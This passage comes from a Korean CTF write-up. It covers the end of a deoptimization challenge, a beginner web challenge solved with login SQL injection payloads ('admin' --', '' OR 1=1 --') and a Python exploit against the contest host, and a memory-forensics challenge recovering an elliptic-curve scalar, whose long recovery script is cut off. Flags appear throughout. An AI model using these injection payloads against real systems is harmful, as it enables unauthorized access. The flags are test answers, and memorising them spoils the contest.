`reference` 실행에는 최적화와 deoptimization 과정이 없으므로 동일한 candidate가 실패합니다. 반면 세 최적화 프로필에서는 각각의 uncommon trap 이후 잘못 복원된 capability가 하나뿐인 sink에 도달합니다.

최종 배포본의 checker는 참가자가 관리자 전용 reference 함수의 바이트열이나 SHA-256 preimage를 그대로 재현하도록 요구하지 않습니다. 세 실행에서 관찰한 주소, register, 구체적인 deopt ID와 함수 구조처럼 빌드에 종속되는 값은 제거하고, 프로필 종류·trap 원인·namespace 전환·frame 관계를 152바이트 canonical transcript로 정규화합니다. 공개 프로필에 들어 있는 대상값은 이 transcript의 SHA-256입니다.

따라서 검증 대상은 비공개 함수와 동일한 바이트열이 아니라 같은 frame-state 충돌 의미를 재현했는지 여부입니다. checker는 `reference` 실패, 세 프로필의 성공 transcript와 seal을 함께 확인한 뒤 플래그 복호화 키를 만듭니다.

```text
HKDF-SHA256(
    raw_transcript || seal_alpha || seal_beta || seal_gamma,
    salt,
    "phantom-frame-v1"
)
```

따라서 checker의 성공 분기만 패치하거나 snapshot에서 root object를 직접 읽는 방식으로는 인증된 transcript와 세 seal을 만들 수 없습니다. 이 키로 `flag.enc`의 XChaCha20-Poly1305 인증을 통과해야 최종 플래그가 복호화됩니다.

```text
SHA{phantom_frames_survive_optimization}
```

#### 4. 익스플로잇

```python
#!/usr/bin/env python3
from pathlib import Path
import subprocess
import sys

HERE = Path(__file__).resolve().parent
USER = HERE.parents[1] / "for_user"
sys.path.insert(0, str(HERE))

from recover_format import recover_opcodes
from synthesize_collision_net import synthesize


def build_candidate() -> None:
    encoded = synthesize().assemble(recover_opcodes())
    (HERE / "reference_candidate.pbc").write_bytes(encoded)
    (USER / "candidate.pbc").write_bytes(encoded)


def main() -> None:
    candidate = USER / "candidate.pbc"
    original = candidate.read_bytes()
    try:
        build_candidate()
        subprocess.run([str(USER / "checker")], cwd=USER, check=True)
        subprocess.run([str(USER / "unwrap")], cwd=USER, check=True)
    finally:
        candidate.write_bytes(original)
        (USER / "receipt.bin").unlink(missing_ok=True)
        (HERE / "reference_candidate.pbc").unlink(missing_ok=True)


if __name__ == "__main__":
    main()
```

### 2.7 고양이는 자고 있었는데 참치는 누가 먹었죠?

| 항목 | 내용 |
|---|---|
| 의뢰인 | `EMPTY_BOWL` |
| 분야 | Web |
| 난이도 | 하 |
| 제공 파일 | 실제 플래그만 더미로 치환한 `app.py` |
| 초기 계정 | `guest / guest` |
| 핵심 원리 | 사용자 입력을 직접 이어 붙인 로그인 SQL 쿼리 |
| 목표 | 로그인 SQL Injection으로 운영자 전용 사건 정보 확인 |
| 플래그 | `SHA{wh0_ate_the_tuna_at_0404}` |

![대회 플랫폼의 급식기 사건 의뢰 화면](/assets/img/room-escape-ctf/extra-requests/ctfd-meowpass-challenge.png)

*그림 10. 스마트 급식기 사건 의뢰 화면.*
{: .text-center }

이 의뢰는 스마트 급식기의 새벽 이벤트를 조사하는 화이트박스 입문용 웹 문제입니다. 의뢰인은 닷새째 새벽 4시 04분마다 참치가 사라지고 있지만 자신의 고양이 나비는 당시 침대에서 자고 있었다고 설명합니다. 급식기에는 등록하지 않은 목걸이 태그 `MP-C7:04:04`가 남아 있습니다.

![로컬에서 실행한 급식기 로그인 화면](/assets/img/room-escape-ctf/extra-requests/meowpass-local-login.png)

*그림 11. 로컬에서 재현한 급식기 로그인 화면.*
{: .text-center }

참가자에게는 의뢰문과 함께 운영 서비스와 동일한 취약점·화면 로직을 가진 `app.py`를 제공합니다. 공개 소스의 플래그만 `SHA{local_dummy_flag}`로 치환하고 템플릿, 정적 리소스, 운영 환경변수와 실제 플래그는 제외했습니다. 따라서 참가자는 무작위 대입이 아니라 제공된 소스를 읽어 의도한 취약점을 찾을 수 있습니다.

#### 1. 낮은 권한 화면 확인

게스트 계정은 사건 번호와 급식 이벤트까지 확인할 수 있지만 보호자와 반려동물 필드는 숨겨집니다. 참가자는 이 화면에서 조사할 사건이 `#404`이며, 다음 단계가 운영자 권한 획득임을 알 수 있습니다.

![게스트 계정에서 보호자 정보가 가려진 사건 화면](/assets/img/room-escape-ctf/extra-requests/meowpass-local-guest-event.png)

*그림 12. 게스트 계정에서 확인한 제한된 사건 정보.*
{: .text-center }

```text
로그인 계정 : guest / guest
사건 번호   : #404
목걸이 태그 : MP-C7:04:04
제한된 정보 : 반려동물과 보호자 정보
```

#### 2. 로그인 SQL Injection

로그인 기능은 사용자가 입력한 값을 다음 SQL 문자열에 직접 삽입합니다.

```sql
SELECT id, username, role FROM accounts
WHERE username = '<username>' AND password = '<password>' LIMIT 1
```

사용자 이름에 SQLite 주석을 삽입하면 관리자 암호 조건을 제거할 수 있습니다.

```text
username: admin' --
password: x
```

실행되는 쿼리는 다음과 같이 바뀝니다.

```sql
SELECT id, username, role FROM accounts
WHERE username = 'admin' -- ' AND password = 'x' LIMIT 1
```

`--` 뒤의 암호 비교와 `LIMIT 1`은 SQLite 주석으로 처리됩니다. `admin` 행이 선택되면서 애플리케이션은 세션에 운영자 역할을 기록합니다. 다음 입력도 관리자 행이 먼저 삽입되어 있으므로 같은 결과를 만듭니다.

```text
username: ' OR 1=1 --
password: x
```

소스에는 Flask session을 위조하거나 관리자 암호를 추측하는 다른 지름길이 없도록 구성했습니다. 운영 서버의 `SECRET_KEY`와 관리자 암호는 프로세스를 시작할 때 무작위로 생성됩니다. 따라서 공개 `app.py`만으로 세션을 서명하거나 암호를 알아낼 수 없으며, 로그인 쿼리의 문자열 결합이 의도한 공격 지점입니다.

운영자 세션으로 이벤트 `#404`를 다시 열면 고양이 이름 `건공이`, 보호자 계정과 사건 원인을 확인할 수 있습니다. 인접 세대의 태그가 공유 급식 그룹에 잘못 연결된 것이 원인이었습니다.

![SQL Injection 성공 후 확인한 사건 화면](/assets/img/room-escape-ctf/extra-requests/meowpass-local-admin-event.png)

*그림 13. 운영자 권한으로 다시 확인한 사건 정보.*
{: .text-center }

#### 3. 사건 확인 코드 제출

운영자 화면에는 다음 정보가 함께 표시됩니다.

```text
고양이 이름 : 건공이
보호자 계정 : NEXTDOOR_302
사건 원인   : 인접 세대 태그가 공유 급식 그룹에 연결됨
```

이벤트 상세 화면에 표시된 사건 확인 코드만 대회 플랫폼에 제출합니다. 고양이 이름과 보호자 계정은 의뢰의 결론을 설명하는 정보이며 플래그 문자열에 별도로 합치지 않습니다.

#### 4. 출제 의도

이 의뢰는 추가 의뢰를 한 문제도 시작하지 못하는 팀이 생기지 않도록 배치한 초급 SQL Injection 문제입니다. 소스에서 취약한 쿼리를 찾고 직접 입력을 구성하면 짧은 과정으로 해결할 수 있게 했으며, 처음 Web 문제를 접한 참가자도 화이트박스 분석과 권한 우회의 기본 흐름을 경험하도록 구성했습니다.

기술 구조는 단순하지만 대회의 의뢰 형식에 맞게 스마트 급식기, 새벽 4시 04분의 이벤트와 사라진 참치를 하나의 사건으로 연결하는 과정이 필요했습니다. 쉬운 문제도 정답 입력만 남겨 두지 않고 대회 전체의 탐정사무소 콘셉트 안에서 자연스럽게 읽히도록 구성했습니다.

```text
SHA{wh0_ate_the_tuna_at_0404}
```

#### 5. 익스플로잇

```python
#!/usr/bin/env python3
import http.cookiejar
import re
import sys
import urllib.parse
import urllib.request


def main() -> int:
    base_url = (
        sys.argv[1] if len(sys.argv) > 1 else "http://web.roomescapectf2026.site:40584"
    ).rstrip("/")
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar())
    )

    body = urllib.parse.urlencode({"username": "admin' -- ", "password": "x"}).encode()
    opener.open(f"{base_url}/login", body, timeout=5).read()
    page = opener.open(f"{base_url}/events/404", timeout=5).read()

    match = re.search(rb"SHA\{[A-Za-z0-9_!?.:-]+\}", page)
    if match is None:
        print("[-] flag not found", file=sys.stderr)
        return 1

    print(match.group(0).decode())
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```
### 2.8 키는 사라졌지만, 흔적은 남아 있을까요?

| 항목 | 내용 |
|---|---|
| 의뢰인 | `N0_KEY_LEFT` |
| 분야 | Misc / Forensics |
| 난이도 | 중 |
| 제공 파일 | `KEYPSAKE-player.zip` |
| 핵심 원리 | 메모리에 남은 width-5 wNAF 잔여값으로 소거된 타원곡선 스칼라 복구 |
| 목표 | 소거된 타원곡선 스칼라의 흔적을 복구해 삭제 PDF 복원 |
| 플래그 | `SHA{wh3n_k3ys_v4n1sh_m3m0ry_r3m3mb3rs}` |

![대회 플랫폼의 삭제 기록 복구 의뢰 화면](/assets/img/room-escape-ctf/extra-requests/ctfd-keypsake-challenge.png)

*그림 14. 삭제 기록 복구 의뢰 화면.*
{: .text-center }

이 의뢰는 실행 중인 서비스의 MiniDump와 암호화된 백업 볼륨을 연결해 삭제된 문서를 복구하는 정적 포렌식 문제입니다. 참가자에게는 telemetry provider DLL, 압축된 메모리 덤프와 암호화 볼륨을 제공합니다.

```text
telemetry_provider.dll
RecordsArchiveService.dmp.zst
records_backup.vhd.kpsk
```

암호화에 사용한 일회성 스칼라 자체는 소거됐지만, 스칼라 곱셈을 준비하던 provider의 width-5 wNAF 표현 일부가 메모리에 남아 있습니다.

#### 1. 볼륨 푸터와 provider image 연결

먼저 암호화 볼륨 푸터의 CRC32와 BLAKE2s를 검증해 context, volume ID, 공개점과 래핑된 키를 얻습니다. MiniDump에서는 provider image와 두 잔여값 체인을 찾고 셔플과 마스크를 역으로 적용해 257개의 signed digit과 correction bitmap을 복원합니다.

덤프의 context record에는 provider 주소가 cookie로 남아 있지만 원래 private image는 지워져 있습니다. 제공된 DLL에서 provider interface, page 구조, pointer cookie와 payload transform을 분석하고, 덤프에 흩어진 PE section fragment를 재구성해 같은 image인지 확인합니다.

#### 2. 두 잔여값 체인과 signed digit 복구

context에는 digit chain과 reliability chain의 head cookie가 따로 있습니다. page의 SipHash tag와 Gray-coded ordinal을 검증하며 연결하면 각각 290바이트와 128바이트가 됩니다. digit chain에는 257개 masked digit과 suspicious bitmap이, reliability chain에는 실제 correction bitmap이 들어 있습니다.

표현은 width-5 wNAF이므로 비영점 digit은 `-15..15` 범위의 홀수이고 비영점 사이에는 최소 다섯 자리의 간격이 있습니다. 이 조건과 provider encoding을 함께 적용해 손상 digit의 후보를 제한합니다.

#### 3. EC meet-in-the-middle로 스칼라 복구

wNAF 조건과 checkpoint의 modular relation으로 손상된 digit 후보를 줄인 뒤, 타원곡선 meet-in-the-middle로 공개점 `Q = eG`와 일치하는 스칼라를 찾습니다. 복구한 스칼라로 ECDH를 수행하고 AES-KWP 무결성 검사를 통과하면 master key를 얻을 수 있습니다.

```text
e = known + left + right  (mod n)
Q - known*G = left*G + right*G
```

왼쪽 후보의 EC point를 저장하고 오른쪽 후보마다 필요한 point를 조회합니다. 선택한 스칼라로 계산한 공개점이 푸터의 ephemeral point와 정확히 같아야 다음 단계로 진행합니다.

#### 4. VHD와 삭제 PDF 복원

마지막으로 encrypted region map을 복호화하고 96개의 data region과 VHD 푸터를 재배치합니다. 복원된 FAT16 볼륨의 journal에서 삭제된 PDF의 최신 유효 revision을 선택하고 incremental update의 receipt를 해제하면 플래그를 확인할 수 있습니다.

복구 과정마다 AES-KWP 무결성, manifest와 97개 region의 GCM tag, VHD 푸터 checksum, FAT 사본, journal commit digest와 fragment CRC를 검증합니다. 마지막 PDF의 `/RecordsRecovery` object에 있는 `KRCPT3` receipt를 해제해 플래그를 얻습니다.

```text
SHA{wh3n_k3ys_v4n1sh_m3m0ry_r3m3mb3rs}
```

#### 5. 익스플로잇

```python
#!/usr/bin/env python3
import argparse
import hashlib
import hmac
import mmap
import struct
import time
import zlib
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.PublicKey import ECC

CURVE = "P-256"
ORDER = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551
MASK = (1 << 64) - 1
T = {
    "version": 1,
    "context": 2,
    "file": 3,
    "volume": 4,
    "ephemeral": 5,
    "operator": 6,
    "wrap": 7,
    "manifest_nonce": 8,
    "manifest": 9,
    "manifest_tag": 10,
    "region": 11,
    "body_size": 12,
    "digest": 13,
    "checksum": 14,
}
RECORD = struct.Struct("<Q16sQQIHHQ")
PAGE = struct.Struct("<QBBH64sQ")
REGISTRATION = struct.Struct("<8sII40s16s24s24sHHHHIQQQII")
DIRECTORY = struct.Struct("<8sIIQQI")
SESSION = struct.Struct("<8sQ16sQQII")
VTABLE = struct.Struct("<8sIQI")
CHECKPOINT = struct.Struct("<8s7H4HI")
MREC = struct.Struct("<IIIII16s")
JHEADER = struct.Struct("<8sHHII16s")
JREC = struct.Struct("<QIHHIIQ")
JCOMMIT = struct.Struct("<QI32s")
CACHE_HEADER = struct.Struct("<8s32s32sQ32s")
CACHE_RECORD = struct.Struct("<64s32s")
CACHE_MAGIC = b"KMITM2\0\0"
FRAGMENT_HEADER = struct.Struct("<QQIHHI")
PROVIDER_INTERFACE = struct.Struct("<5I4x4Q")
CONTRACT_PREFIX = struct.Struct("<8sHH10B5H11Q")
CRYPTO_BINDING = struct.Struct("<BBB6sQ")
CONTRACT_SIZE = CONTRACT_PREFIX.size + 8 * CRYPTO_BINDING.size + 4 * 8 + 4


def rol(x, n):
    return ((x << n) | (x >> (64 - n))) & MASK


def next64(state):
    state ^= state >> 12
    state ^= (state << 25) & MASK
    state ^= state >> 27
    state &= MASK
    return state, (state * 2685821657736338717) & MASK


def derive(context, file_token, volume, domain):
    return hashlib.blake2s(struct.pack("<QQ", context, file_token) + volume + domain).digest()


def hkdf(ikm, salt, info, n=32):
    prk = hmac.new(salt, ikm, hashlib.sha256).digest()
    out = b""
    prev = b""
    i = 1
    while len(out) < n:
        prev = hmac.new(prk, prev + info + bytes([i]), hashlib.sha256).digest()
        out += prev
        i += 1
    return out[:n]


def point(raw):
    if len(raw) != 65 or raw[0] != 4:
        raise ValueError("invalid uncompressed EC point")
    return ECC.EccPoint(
        int.from_bytes(raw[1:33], "big"), int.from_bytes(raw[33:], "big"), curve=CURVE
    )


def pkey(p):
    return int(p.x).to_bytes(32, "big") + int(p.y).to_bytes(32, "big")


def file_sha(path, offset=0):
    digest = hashlib.sha256()
    with Path(path).open("rb") as stream:
        stream.seek(offset)
        for chunk in iter(lambda: stream.read(1 << 20), b""):
            digest.update(chunk)
    return digest.digest()


def siphash24(data, k0, k1):
    def r(x, n):
        return ((x << n) | (x >> (64 - n))) & MASK

    v0 = 0x736F6D6570736575 ^ k0
    v1 = 0x646F72616E646F6D ^ k1
    v2 = 0x6C7967656E657261 ^ k0
    v3 = 0x7465646279746573 ^ k1

    def rnd(v0, v1, v2, v3):
        v0 = (v0 + v1) & MASK
        v1 = r(v1, 13) ^ v0
        v0 = r(v0, 32)
        v2 = (v2 + v3) & MASK
        v3 = r(v3, 16) ^ v2
        v0 = (v0 + v3) & MASK
        v3 = r(v3, 21) ^ v0
        v2 = (v2 + v1) & MASK
        v1 = r(v1, 17) ^ v2
        v2 = r(v2, 32)
        return v0, v1, v2, v3

    offset = 0
    while offset + 8 <= len(data):
        word = int.from_bytes(data[offset : offset + 8], "little")
        offset += 8
        v3 ^= word
        v0, v1, v2, v3 = rnd(v0, v1, v2, v3)
        v0, v1, v2, v3 = rnd(v0, v1, v2, v3)
        v0 ^= word
    tail = len(data) << 56
    for i, b in enumerate(data[offset:]):
        tail |= b << (8 * i)
    v3 ^= tail
    v0, v1, v2, v3 = rnd(v0, v1, v2, v3)
    v0, v1, v2, v3 = rnd(v0, v1, v2, v3)
    v0 ^= tail
    v2 ^= 0xFF
    for _ in range(4):
        v0, v1, v2, v3 = rnd(v0, v1, v2, v3)
    return v0 ^ v1 ^ v2 ^ v3


def decode_payload(kind, ordinal, page_type, used, payload):
    expected = (ordinal + kind) & 0xFF
    raw = payload[:used]
    if page_type == 0:
        return raw
    if page_type == 1:
        return raw[::-1]
    even = (used + 1) // 2
    out = bytearray(used)
    for i in range(used):
        out[i] = raw[i // 2 if i % 2 == 0 else even + i // 2]
    return bytes(out)


def footer(blob):
    length = struct.unpack("<I", blob[-4:])[0]
    start = len(blob) - 4 - length
    if start < 0 or length > 0x10000:
        raise ValueError("bad footer length")
    raw = blob[start:-4]
    fields = {}
    cursor = 0
    checksum_at = None
    digest_at = None
    while cursor < len(raw):
        at = cursor
        kind, size = struct.unpack_from("<BH", raw, cursor)
        cursor += 3
        if cursor + size > len(raw):
            raise ValueError("truncated footer")
        if kind in fields:
            raise ValueError("duplicate footer field")
        fields[kind] = raw[cursor : cursor + size]
        if kind == T["digest"]:
            digest_at = at
        if kind == T["checksum"]:
            checksum_at = at
        cursor += size
    if set(fields) != set(T.values()):
        raise ValueError("invalid footer field set")
    sizes = {
        T["version"]: 2,
        T["context"]: 8,
        T["file"]: 8,
        T["volume"]: 16,
        T["ephemeral"]: 65,
        T["operator"]: 65,
        T["wrap"]: 40,
        T["manifest_nonce"]: 12,
        T["manifest_tag"]: 16,
        T["region"]: 4,
        T["body_size"]: 8,
        T["digest"]: 32,
        T["checksum"]: 4,
    }
    if (
        any(len(fields[kind]) != size for kind, size in sizes.items())
        or len(fields[T["manifest"]]) < 16
    ):
        raise ValueError("invalid footer field length")
    if (
        struct.unpack("<H", fields[T["version"]])[0] != 3
        or digest_at + 35 != checksum_at
        or checksum_at + 7 != len(raw)
    ):
        raise ValueError("invalid footer field order")
    if zlib.crc32(raw[:checksum_at]) & 0xFFFFFFFF != struct.unpack("<I", fields[T["checksum"]])[0]:
        raise ValueError("footer CRC mismatch")
    if hashlib.blake2s(raw[:digest_at], person=b"KPSKv3").digest() != fields[T["digest"]]:
        raise ValueError("footer digest mismatch")
    return blob[:start], fields


class Dump:
    def __init__(self, path):
        self.file = Path(path).open("rb")
        self.data = mmap.mmap(self.file.fileno(), 0, access=mmap.ACCESS_READ)
        self.ranges = []
        if self.data[:4] != b"MDMP":
            raise ValueError("not a minidump")
        streams, table = struct.unpack_from("<II", self.data, 8)
        for i in range(streams):
            kind, size, rva = struct.unpack_from("<III", self.data, table + i * 12)
            if kind == 9:
                count, base = struct.unpack_from("<QQ", self.data, rva)
                offset = base
                for j in range(count):
                    va, length = struct.unpack_from("<QQ", self.data, rva + 16 + j * 16)
                    self.ranges.append((va, va + length, offset))
                    offset += length
        if not self.ranges:
            raise ValueError("Memory64List stream missing")

    def read(self, va, size):
        for start, end, offset in self.ranges:
            if start <= va and va + size <= end:
                return self.data[offset + va - start : offset + va - start + size]
        raise ValueError(f"unmapped address 0x{va:x}")

    def va_for_offset(self, file_offset):
        for start, end, offset in self.ranges:
            if offset <= file_offset < offset + end - start:
                return start + file_offset - offset
        raise ValueError(f"dump offset 0x{file_offset:x} is outside memory ranges")

    def range_for(self, va):
        for start, end, _ in self.ranges:
            if start <= va < end:
                return start, end
        raise ValueError(f"unmapped address 0x{va:x}")

    def cstring(self, va, limit=256):
        raw = bytearray()
        for index in range(limit):
            value = self.read(va + index, 1)
            if value == b"\0":
                return bytes(raw)
            raw += value
        raise ValueError(f"unterminated string at 0x{va:x}")

    def close(self):
        self.data.close()
        self.file.close()


def validate_provider_fragments(dump, provider_address):
    address_mask = 0xD6E8FEB86659FD93
    link_mask = 0x94D049BB133111EB
    fragments = []
    alignment = dump.ranges[0][2] & 7
    for offset in range(alignment, len(dump.data) - FRAGMENT_HEADER.size - 4096, 8):
        encoded, nxt, size, index, total, checksum = FRAGMENT_HEADER.unpack_from(dump.data, offset)
        if not 0 < size <= 4096 or not 0 < total < 128 or index >= total:
            continue
        original = encoded ^ address_mask ^ rol(index + 1, 19)
        if original & 0xFFF:
            continue
        payload = dump.data[offset + FRAGMENT_HEADER.size : offset + FRAGMENT_HEADER.size + size]
        if (
            zlib.crc32(dump.data[offset : offset + 24]) ^ zlib.crc32(payload)
        ) & 0xFFFFFFFF != checksum:
            continue
        fragments.append(
            {
                "index": index,
                "total": total,
                "offset": offset,
                "allocation": dump.va_for_offset(offset),
                "original": original,
                "encoded": encoded,
                "next": nxt,
                "size": size,
                "payload": bytes(payload),
            }
        )
    if not fragments:
        raise ValueError("provider fragments missing")
    totals = {fragment["total"] for fragment in fragments}
    if len(totals) != 1:
        raise ValueError("provider fragment totals disagree")
    total = totals.pop()
    by_index = {fragment["index"]: fragment for fragment in fragments}
    if len(fragments) != total or len(by_index) != total or set(by_index) != set(range(total)):
        raise ValueError("provider fragment sequence incomplete")
    ordered = [by_index[index] for index in range(total)]
    for index, fragment in enumerate(ordered):
        expected = (
            0
            if index + 1 == total
            else ordered[index + 1]["allocation"] ^ fragment["encoded"] ^ link_mask
        )
        if fragment["next"] != expected:
            raise ValueError("provider fragment link mismatch")

    def image_read(address, size):
        output = bytearray()
        while len(output) < size:
            fragment = next(
                (
                    item
                    for item in ordered
                    if item["original"] <= address < item["original"] + item["size"]
                ),
                None,
            )
            if fragment is None:
                raise ValueError(f"provider image gap at 0x{address:x}")
            take = min(size - len(output), fragment["original"] + fragment["size"] - address)
            start = address - fragment["original"]
            output += fragment["payload"][start : start + take]
            address += take
        return bytes(output)

    version, width, digits, damaged, suspicious, *functions = PROVIDER_INTERFACE.unpack(
        image_read(provider_address, PROVIDER_INTERFACE.size)
    )
    if (version, width, digits, damaged, suspicious) != (4, 5, 257, 24, 32):
        raise ValueError("provider interface metadata mismatch")
    for function in functions:
        if not any(
            fragment["original"] <= function < fragment["original"] + fragment["size"]
            for fragment in ordered
        ):
            raise ValueError("provider interface function is outside reconstructed image")
    return total


def validate_recovery_contract(dump, address, recovery_status):
    raw = dump.read(address, CONTRACT_SIZE)
    prefix = CONTRACT_PREFIX.unpack_from(raw)
    magic, version, size = prefix[:3]
    if (
        magic != b"RARC5\0\0\0"
        or version != 5
        or size != CONTRACT_SIZE
        or zlib.crc32(raw[:-4]) & 0xFFFFFFFF != struct.unpack_from("<I", raw, CONTRACT_SIZE - 4)[0]
    ):
        raise ValueError("invalid recovery contract")
    if prefix[3:13] != (1, 2, 3, 4, 4, 5, 1, 2, 3, 4) or prefix[13:18] != (
        MREC.size,
        JHEADER.size,
        JREC.size,
        JCOMMIT.size,
        56,
    ):
        raise ValueError("recovery contract format mismatch")
    expected_strings = (
        b"KMAP4",
        b"KJNL5",
        b"KRCPT3",
        b"BLAKE2S-256|CRC32|AES-KWP|AES-256-GCM|SHAKE-256|HKDF-SHA256|CONCAT",
        b"none|shared_x|master|volume|context|file_token|logical|generation|pdf|ephemeral_point|document_id|length|footer_body|domain",
        b"KPSKv3",
        b"envelope-v3",
        b"manifest-v3",
        b"region-v3",
        b"KPSKreg",
        b"receipt-v3",
    )
    pointers = prefix[18:29]
    if tuple(dump.cstring(pointer) for pointer in pointers) != expected_strings:
        raise ValueError("recovery contract strings mismatch")
    expected_bindings = (
        (1, 32, (12,), b"KPSKv3"),
        (6, 32, (1, 3, 13, 4, 5), b"envelope-v3"),
        (6, 32, (2, 3, 13), b"manifest-v3"),
        (6, 32, (2, 3, 13, 6, 7), b"region-v3"),
        (1, 12, (3, 6, 7), b"KPSKreg"),
        (5, 0, (8, 3, 9, 10, 13), b"receipt-v3"),
        (7, 0, (4, 5, 9), None),
        (7, 0, (4, 5, 6, 7, 11), None),
    )
    cursor = CONTRACT_PREFIX.size
    for expected in expected_bindings:
        primitive, output_size, input_count, inputs, domain = CRYPTO_BINDING.unpack_from(
            raw, cursor
        )
        cursor += CRYPTO_BINDING.size
        decoded = tuple(inputs[:input_count])
        decoded_domain = dump.cstring(domain) if domain else None
        if (primitive, output_size, decoded, decoded_domain) != expected:
            raise ValueError("recovery contract binding mismatch")
    image_start, image_end = dump.range_for(address)
    functions = struct.unpack_from("<4Q", raw, cursor)
    if any(not image_start <= function < image_end for function in functions):
        raise ValueError("recovery parser function is outside service image")
    checksum = struct.unpack_from("<I", raw, CONTRACT_SIZE - 4)[0]
    if recovery_status != (checksum ^ CONTRACT_SIZE ^ 1) & 0xFFFFFFFF:
        raise ValueError("recovery contract self-test mismatch")


def record_and_pages(dump, context, file_token, volume):
    tag = derive(context, file_token, volume, b"trace-v3")[:16]
    hits = []
    cursor = 0
    while True:
        hit = dump.data.find(tag, cursor)
        if hit < 0:
            break
        cursor = hit + 1
        start = hit - 8
        if start < 0 or start + RECORD.size > len(dump.data):
            continue
        raw = dump.data[start : start + RECORD.size]
        (
            provider,
            candidate,
            digit_head,
            reliability_head,
            state,
            digit_count,
            reliability_count,
            record_tag,
        ) = RECORD.unpack(raw)
        chain = (
            int.from_bytes(derive(context, file_token, volume, b"chain-v3")[:8], "little")
            or 0xA0761D6478BD642F
        )
        k0 = chain
        k1 = chain ^ context ^ file_token
        if (
            candidate == tag
            and state in (2, 3)
            and digit_count == 5
            and reliability_count == 2
            and siphash24(raw[:-8], k0, k1) == record_tag
        ):
            hits.append((start, provider, digit_head, reliability_head, state, chain))
    if len(hits) != 1:
        raise ValueError(f"expected one context, found {len(hits)}")
    offset, provider_cookie, digit_cookie, reliability_cookie, state, chain = hits[0]
    k0 = chain
    k1 = chain ^ context ^ file_token

    def read_chain(address, count, kind):
        blob = bytearray()
        for ordinal in range(count):
            raw = dump.read(address, PAGE.size)
            nxt, ordinal_code, type_code, used, payload, page_tag = PAGE.unpack(raw)
            page_type = type_code & 0xF
            if (
                ordinal_code != (ordinal ^ (ordinal >> 1))
                or type_code >> 4 != kind
                or page_type > 2
                or used > 64
                or siphash24(raw[:-8], k0, k1) != page_tag
            ):
                raise ValueError("broken keyed residue page")
            blob += decode_payload(kind, ordinal, page_type, used, payload)
            if ordinal < count - 1:
                if not nxt:
                    raise ValueError("truncated residue chain")
                address = nxt ^ chain ^ rol(context, ordinal + 9 + kind * 3)
            elif nxt:
                raise ValueError("residue chain has a tail")
        return bytes(blob)

    digit_address = digit_cookie ^ chain ^ rol(file_token, 23)
    reliability_address = reliability_cookie ^ chain ^ rol(context ^ file_token, 31)
    digits = read_chain(digit_address, 5, 0)
    reliability = read_chain(reliability_address, 2, 1)
    if len(digits) != 290 or len(reliability) != 128:
        raise ValueError("bad residue chain length")
    provider = provider_cookie ^ context ^ rol(file_token, 17)
    return offset, provider, digits, reliability, state


def decode_digits(blob, reliability, context, file_token, volume):
    state = (
        int.from_bytes(derive(context, file_token, volume, b"shuffle-v3")[:8], "little")
        or 0x8EBC6AF09C88C6E3
    )
    permutation = list(range(257))
    for i in range(256, 0, -1):
        state, value = next64(state)
        j = value % (i + 1)
        permutation[i], permutation[j] = permutation[j], permutation[i]
    observed = [None] * 257
    damaged = [False] * 257
    suspicious = [False] * 257
    suspicious_bitmap = blob[257:290]
    correction_bitmap = reliability[:33]
    for stored in range(257):
        state, value = next64(state)
        logical = permutation[stored]
        observed[logical] = blob[stored] ^ (value & 0xFF)
        suspicious[logical] = bool(suspicious_bitmap[stored >> 3] & (1 << (stored & 7)))
        damaged[logical] = bool(correction_bitmap[stored >> 3] & (1 << (stored & 7)))
    candidates = []
    valid = [0] + list(range(-15, 16, 2))
    for i, (code, bad) in enumerate(zip(observed, damaged)):
        if bad:
            choices = [
                d
                for d in valid
                if (((d + 16) & 31) & code) == code and ((((d + 16) & 31) ^ code).bit_count() == 1)
            ]
        else:
            choices = [d for d in valid if ((d + 16) & 31) == code]
        if not choices:
            raise ValueError(f"invalid digit residue at {i}")
        candidates.append(choices)
    return candidates, sum(suspicious)


def recovery_checkpoint(dump, context, file_token, volume):
    registrations = []
    cursor = 0
    while True:
        hit = dump.data.find(b"CPERF4\0", cursor)
        if hit < 0:
            break
        cursor = hit + 1
        if hit + REGISTRATION.size > len(dump.data):
            continue
        raw = dump.data[hit : hit + REGISTRATION.size]
        values = REGISTRATION.unpack(raw)
        if (
            values[1] == REGISTRATION.size
            and values[2] == 4
            and zlib.crc32(raw[:-4]) & 0xFFFFFFFF == values[-1]
        ):
            registrations.append(values)
    if len(registrations) != 1:
        raise ValueError(f"expected one provider registration, found {len(registrations)}")
    reg = registrations[0]
    active_session, dir_cookie, encoded_directory = reg[12], reg[13], reg[14]
    expected_session = context ^ rol(file_token, 29)
    text = lambda value: value.rstrip(b"\0")
    if (
        text(reg[3]),
        text(reg[4]),
        text(reg[5]),
        text(reg[6]),
        reg[7],
        reg[8],
        reg[9],
        reg[10],
        reg[11],
    ) != (
        b"Records Archive Crypto Telemetry",
        b"ECDH",
        b"transition samples",
        b"sample confidence",
        5,
        257,
        5,
        2,
        3,
    ):
        raise ValueError("provider registration metadata mismatch")
    if active_session != expected_session:
        raise ValueError("registration session mismatch")
    directory_address = encoded_directory ^ dir_cookie ^ rol(active_session, 11)
    directory_raw = dump.read(directory_address, DIRECTORY.size)
    directory = DIRECTORY.unpack(directory_raw)
    if (
        directory[0] != b"RDIR5\0\0\0"
        or directory[1] != 5
        or directory[2] != 1
        or directory[3] != dir_cookie
        or zlib.crc32(directory_raw[:-4]) & 0xFFFFFFFF != directory[-1]
    ):
        raise ValueError("invalid recovery directory")
    session_address = directory[4] ^ dir_cookie ^ rol(active_session, 17)
    session_raw = dump.read(session_address, SESSION.size)
    session = SESSION.unpack(session_raw)
    if (
        session[0] != b"RSES5\0\0\0"
        or session[1] != active_session
        or session[2] != volume
        or session[5] != 3
        or zlib.crc32(session_raw[:-4]) & 0xFFFFFFFF != session[-1]
    ):
        raise ValueError("invalid recovery session")
    vtable_raw = dump.read(session[3], VTABLE.size)
    vtable = VTABLE.unpack(vtable_raw)
    if (
        vtable[0] != b"RVTB5\0\0\0"
        or vtable[1] != 5
        or zlib.crc32(vtable_raw[:-4]) & 0xFFFFFFFF != vtable[-1]
        or dump.read(vtable[2], 8) != b"RARC5\0\0\0"
    ):
        raise ValueError("invalid recovery vtable")
    validate_recovery_contract(dump, vtable[2], reg[15])
    raw = dump.read(session[4], CHECKPOINT.size)
    values = CHECKPOINT.unpack(raw)
